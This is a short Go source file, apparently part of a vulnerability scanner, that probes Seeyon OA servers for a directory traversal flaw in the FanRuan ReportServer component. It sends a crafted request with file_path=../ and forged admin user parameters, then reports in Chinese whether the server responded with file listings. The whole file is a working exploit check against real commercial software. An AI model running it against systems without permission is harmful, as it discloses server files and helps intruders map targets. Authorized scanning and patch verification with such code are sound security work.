package zhiyuan_OA_ReportServer

import (
	"github.com/gookit/color"
	"github.com/imroc/req/v3"
	"strings"
	"time"
)

var (
	client = req.C().EnableForceHTTP1().EnableDumpEachRequest().SetTimeout(5 * time.Second)
	UA     = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36"
)

func Run(url string) {
	vulnUrl := url + "/seeyonreport/ReportServer?op=fs_remote_design&cmd=design_list_file&file_path=../&currentUserName=admin&currentUserId=1&isWebReport=true"
	resp, err := client.R().
		SetHeaders(map[string]string{
			"User-Agent": UA,
		}).Get(vulnUrl)

	if err != nil {
		color.Red.Println("[-]	致远OA 帆软组件 ReportServer 目录遍历漏洞不存在")
		return
	}

	responseContent := resp.String()
	if resp.StatusCode == 200 && (strings.Contains(responseContent, "Node") || strings.Contains(responseContent, "xml") || strings.Contains(responseContent, "envPath")) {
		color.Green.Println("[+] 致远OA 帆软组件 ReportServer 目录遍历漏洞存在 -> " + url)
	} else {
		color.Red.Println("[-]	致远OA 帆软组件 ReportServer 目录遍历漏洞不存在")
	}
}
